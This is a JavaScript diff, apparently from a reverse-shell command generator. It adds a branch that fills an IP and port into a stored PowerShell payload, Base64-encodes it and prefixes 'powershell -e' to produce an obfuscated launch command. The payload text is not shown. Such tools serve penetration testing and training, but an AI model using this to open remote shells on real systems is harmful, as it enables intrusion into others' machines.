@@ -5,6 +5,12 @@ const insertParameters = function (command, params) {
     // so the insertParameters + encoding logic can be reused
     const encoder = (value) => value;
 
+    if (command === "PowerShell #3 (Base64)") {
+        return "powershell -e " + btoa(rsgData.specialCommands['PowerShell payload']
+            .replace(encoder('{ip}'), encoder(params.ip))
+            .replace(encoder('{port}'), encoder(String(params.port))))
+    }
+
     return command
         .replace(encoder('{ip}'), encoder(params.ip))
         .replace(encoder('{port}'), encoder(String(params.port)))
